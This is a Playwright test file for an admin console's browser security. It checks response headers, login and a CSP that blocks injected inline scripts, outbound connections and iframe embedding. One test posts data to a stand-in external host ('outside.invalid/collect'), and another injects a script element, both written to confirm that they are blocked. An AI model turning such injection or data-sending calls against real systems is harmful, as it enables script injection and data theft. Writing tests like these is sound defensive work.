import { test, expect } from "@playwright/test";

const root = "http://127.0.0.1:5180/api/admin/console/";

test("built console loads with restrictive browser headers", async ({ page }) => {
  const errors: string[] = [];
  page.on("pageerror", (error) => errors.push(error.message));
  const response = await page.goto(root);
  const headers = response?.headers();
  expect(headers?.["content-security-policy"]).not.toContain("unsafe-inline");
  expect(headers?.["x-frame-options"]).toBe("DENY");
  expect(headers?.["x-content-type-options"]).toBe("nosniff");
  expect(headers?.["referrer-policy"]).toBe("no-referrer");
  expect(headers?.["cache-control"]).toBe("no-store");
  await page.getByLabel("Username").fill("owner");
  await page.getByLabel("Password").fill("invalid-preview-password");
  await page.getByRole("button", { name: "Sign in", exact: true }).click();
  await expect(page.getByRole("alert")).toBeVisible();
  await expect(page.getByRole("heading", { name: "Overview", exact: true })).toHaveCount(0);
  await page.getByLabel("Password").fill("a private phrase for preview");
  await page.getByRole("button", { name: "Sign in", exact: true }).click();
  await expect(page.getByRole("heading", { name: "Overview", exact: true })).toBeVisible();
  await page.getByRole("link", { name: "Storage", exact: true }).click();
  await page.getByRole("button", { name: "Register", exact: true }).click();
  await expect(page.getByRole("dialog")).toBeVisible();
  expect(errors).toEqual([]);
});

test("built console blocks injected inline scripts", async ({ page }) => {
  await page.goto(root);
  await page.evaluate(() => {
    document.addEventListener("securitypolicyviolation", (event) => {
      document.documentElement.dataset.blockedDirective = event.effectiveDirective;
    }, { once: true });
    const script = document.createElement("script");
    script.textContent = 'document.documentElement.dataset.injected = "executed"';
    document.head.append(script);
  });
  await expect(page.locator("html")).toHaveAttribute("data-blocked-directive", /script-src/);
  await expect(page.locator("html")).not.toHaveAttribute("data-injected");
});

test("built console blocks external connections before transmission", async ({ page }) => {
  const external: string[] = [];
  page.on("request", (request) => {
    if (request.url().startsWith("https://outside.invalid/")) external.push(request.url());
  });
  await page.goto(root);
  await page.evaluate(async () => {
    document.addEventListener("securitypolicyviolation", (event) => {
      document.documentElement.dataset.blockedDirective = event.effectiveDirective;
    }, { once: true });
    try {
      await fetch("https://outside.invalid/collect", { method: "POST", body: "fixture-only" });
    } catch {
      // CSP must reject this request before the browser sends it.
    }
  });
  await expect(page.locator("html")).toHaveAttribute("data-blocked-directive", "connect-src");
  expect(external).toEqual([]);
});

test("built console cannot be embedded in an iframe", async ({ page }) => {
  let blocked = false;
  page.on("console", (message) => {
    if (message.text().includes("frame-ancestors")) blocked = true;
  });
  await page.route("**/frame-test", (route) => route.fulfill({
    contentType: "text/html",
    body: `<iframe src="${root}"></iframe>`,
  }));
  await page.goto("http://127.0.0.1:5180/frame-test");
  await expect.poll(() => blocked).toBe(true);
  await expect(page.frameLocator("iframe").getByRole("heading", { name: "Overview", exact: true })).toHaveCount(0);
});
